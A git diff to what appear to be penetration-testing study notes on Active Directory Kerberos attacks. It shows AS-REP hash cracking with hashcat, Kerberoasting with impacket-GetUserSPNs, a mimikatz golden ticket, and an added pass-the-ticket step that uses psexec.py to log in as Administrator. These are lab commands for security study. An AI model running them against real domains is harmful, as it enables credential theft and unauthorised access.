@@ -93,6 +93,7 @@ Got the hash of THe user, use hashcat crack it, normally -m 18200
 ```
 ###### Kerberosting
 // request TGS of a SPN/service from KDC, and crack the hash get the service
+```
 Method1: from Linux
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 
@@ -117,4 +118,9 @@ mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domai
 
 //check whetehr the ticket is loaded in ram
 PS C:\Tools> klist
+
+//next we can export the ticket in a file and use it to login into the host the target service can login.
+export KRB5CCNAME=Administrator.ccache
+
+python3 psexec.py -k -no-pass corp.com/Administrator@target-server.corp.com
 ```
